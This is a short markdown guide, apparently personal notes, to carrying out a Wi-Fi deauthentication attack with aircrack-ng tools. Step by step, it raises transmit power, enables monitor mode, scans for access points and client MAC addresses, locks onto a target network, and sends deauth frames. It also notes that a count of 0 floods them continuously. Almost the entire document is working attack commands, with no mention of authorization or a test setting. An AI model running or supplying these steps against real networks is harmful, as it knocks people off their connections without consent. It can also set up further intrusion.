# Deauthentication Attack
## Setup
Set router to max power
```
ifconfig wlan1 down
```
```
iwconfig wlan1 txpower 30
```
```
ifconfig wlan1 up
```
Preemptively kill everything that gets in your way:
```
sudo airmon-ng check kill
```
Start monitor mode:
```
sudo airmon-ng start wlan1
```
Run a test:
```
sudo aireplay-ng --test wlan1mon
```
Should see `Injection is working!`

Save what's out there and save to a file:
```
sudo airodump-ng wlan1mon --band agp -w dump
```

### Gather MAC addresses
Use this command to see live network traffic, enabling you to see all the devices on the network and their MAC addresses. if you run this live you'll inevitably see the clients disconnect and reconnect when you deauth. Remember to add `--band a` for 5GHz: 
```
sudo airodump-ng wlan1mon --band abg -w dump
```
The top half are going to be the available WIFI networks / Access Points (APs). You have to output to file because the terminal is too small to display all of them. The bottom half are going to be clients/`STATIONS` and the `Probes` should tell you what they're connected to.

---

### Monitor traffic
Once you've found your target, listen to it live with:
```
sudo airodump-ng wlan1mon --bssid XX:XX:XX:XX:XX:XX --band abg
```
OR (try both - router likely broadcasts multiple BSSIDs, once for each GHz or if it multiplate bands(?))
```
sudo airodump-ng wlan1mon --essid "NetworkName" --band abg
```

---

### Deauth
The actual deauth - where `5` is the number of deauths, `0` would be to send them continously.
```
sudo aireplay-ng -0 5 -a ACCESSPOINT-BSSID -c CLIENT-BSSID wlan1mon
```

---

## -- NOTES
You have to be on the same channel as the AP you're deauthing, change it with:
```
iwconfig wlan1mon channel 149
```

---
### For list of attacks:
We want `0` here
```
aireplay-ng
```
